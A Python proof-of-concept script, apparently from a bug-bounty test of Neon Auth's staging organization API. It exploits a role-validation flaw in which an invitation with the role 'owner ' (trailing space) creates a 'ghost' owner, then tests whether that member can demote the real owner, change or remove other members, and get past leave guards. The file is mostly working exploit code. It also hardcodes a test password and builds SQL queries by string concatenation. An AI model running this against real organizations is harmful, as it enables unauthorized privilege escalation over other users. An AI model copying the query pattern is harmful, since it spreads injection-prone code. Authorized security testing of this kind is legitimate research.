# -*- coding: utf-8 -*-
"""V9d: ghost-owner management matrix (final closure)
R1: owner removes ghost 'owner ' member - allowed?
R2: ghost member leaves itself - allowed?
R3: ghost can update/remove OTHER members? (admin-tier ops?)
R4: owner downgrades ghost -> member (repair)?
R5: leave-guard counts ghosts? (owner w/ ghost leaves -> blocked?)
R6: ghost count in list org members via API (view-level role string)"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
U3 = "libobo1229+na_org3@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.5)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.5)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def mid(org, email):
    r = dbq('SELECT m.id FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
            'WHERE m."organizationId"=%s AND u.email=%s' % ("'" + org + "'", "'" + email + "'"))
    return str(r[0][0]) if r else None


def members(org):
    return dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
               'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))


def main():
    out("== V9d ghost-owner management ==")
    fetch_db_uri()
    c1, c2, c3 = auth(U1), auth(U2), auth(U3)
    out("sessions: %s" % [bool(c1), bool(c2), bool(c3)])
    if not all([c1, c2, c3]):
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v9d-org", "slug": "v9d-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return

    # ghost: owner invites U2 role='owner ' (trailing space) + U3 as member
    for em, rv, ck in [(U2, "owner ", c2), (U3, "member", c3)]:
        st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                      {"organizationId": org, "email": em, "role": rv}, c1)
        r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
                'AND status=%s' % ("'" + org + "'", "'" + em + "'", "'pending'"))
        iid = str(r[0][0]) if r else None
        if iid:
            st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                          {"invitationId": iid}, ck)
            out("join %s as %r -> %d" % (em, rv, st))
    m1, m2, m3 = mid(org, U1), mid(org, U2), mid(org, U3)
    out("   members db: %s" % [(x[0], repr(x[1])) for x in members(org)])

    # R3: ghost U2 updates U3 role / removes U3?
    st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                  {"organizationId": org, "memberId": m3, "role": "admin"}, c2)
    out("R3 ghost updates U3      -> %d %s" % (st, d[:120]))
    st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                  {"organizationId": org, "memberIdOrEmail": m3}, c2)
    out("R3b ghost removes U3     -> %d %s" % (st, d[:120]))
    st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                  {"organizationId": org, "memberId": m1, "role": "member"}, c2)
    out("R3c ghost demotes U1     -> %d %s" % (st, d[:120]))

    # R4: owner repairs ghost -> member
    st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                  {"organizationId": org, "memberId": m2, "role": "member"}, c1)
    out("R4 owner ghost->member   -> %d %s" % (st, d[:120]))
    out("   members: %s" % [(x[0], repr(x[1])) for x in members(org)])

    # R1/R2: recreate ghost; owner removes ghost; ghost leaves
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": U2, "role": "owner "}, c1)
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + org + "'", "'" + U2 + "'", "'pending'"))
    iid = str(r[0][0]) if r else None
    if iid:
        na("POST", "/neondb/auth/organization/accept-invitation", {"invitationId": iid}, c2)
        m2 = mid(org, U2)
        st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                      {"organizationId": org, "memberIdOrEmail": m2}, c1)
        out("R1 owner removes ghost    -> %d %s" % (st, d[:120]))
        out("   members: %s" % [(x[0], repr(x[1])) for x in members(org)])
        # ghost again for R2/R5
        st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                      {"organizationId": org, "email": U2, "role": "owner "}, c1)
        r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
                'AND status=%s' % ("'" + org + "'", "'" + U2 + "'", "'pending'"))
        iid = str(r[0][0]) if r else None
        if iid:
            na("POST", "/neondb/auth/organization/accept-invitation", {"invitationId": iid}, c2)
            st, d, _ = na("POST", "/neondb/auth/organization/leave",
                          {"organizationId": org}, c2)
            out("R2 ghost self-leave       -> %d %s" % (st, d[:120]))
            out("   members: %s" % [(x[0], repr(x[1])) for x in members(org)])
            # R5: owner leave with ghost present (guard counts?)
            st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                          {"organizationId": org, "email": U2, "role": "owner "}, c1)
            r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
                    'AND status=%s' % ("'" + org + "'", "'" + U2 + "'", "'pending'"))
            iid = str(r[0][0]) if r else None
            if iid:
                na("POST", "/neondb/auth/organization/accept-invitation",
                   {"invitationId": iid}, c2)
                st, d, _ = na("POST", "/neondb/auth/organization/leave",
                              {"organizationId": org}, c1)
                out("R5 owner leave w/ ghost   -> %d %s" % (st, d[:120]))
                out("   members: %s" % [(x[0], repr(x[1])) for x in members(org)])

    # cleanup: owner deletes org (exact owner = U1)
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1)
    out("cleanup delete org -> %d %s" % (st, d[:80]))
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
